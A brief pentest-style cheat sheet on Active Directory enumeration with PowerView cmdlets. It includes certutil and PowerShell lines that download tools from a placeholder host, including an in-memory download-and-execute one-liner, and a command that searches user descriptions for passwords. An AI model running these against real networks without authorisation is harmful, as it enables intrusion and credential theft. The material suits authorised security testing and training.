# Active Directory enumeration

## Downloading our tools

We can download files onto disk using: 
    `certutil.exe` inside cmd,
    `Invoke-WebRequest` (or it's wget/curl alias) inside powershell.

```powershell
certutil.exe -urlcache -f http://RHOST:RPORT/file.ps1 file.ps1
Invoke-WebRequest http://RHOST:RPORT/file.ps1 -OutFile file.ps1
```

We can also load files straight into memory using `iex`.

```powershell
iex (New-Object Net.WebClient).DownloadString("http://RHOST:RPORT/file.ps1")
```

## Enumerating users

```powershell
Get-NetUser
Get-NetUser | Select cn
Get-NetUser | Select -ExpandProperty samaccountname
Find-UserField -SearchField description "pass"
Invoke-EnumerateLocalAdmin
```

## Enumerating groups

```powershell
Get-NetGroup
Get-NetGroup -UserName "USERNAME"
Get-NetGroup -GroupName "GROUPNAME" -FullData
```

## Enumerating computers and shares

```powershell
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -OperatingSystem "*windows 10*"
Get-NetComputer -OperatingSystem "*server 2019*"
Invoke-ShareFinder 
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC 
```

## Enumerating misc.

```powershell
Get-NetDomain
Get-NetGPO
Get-ObjectACL
```
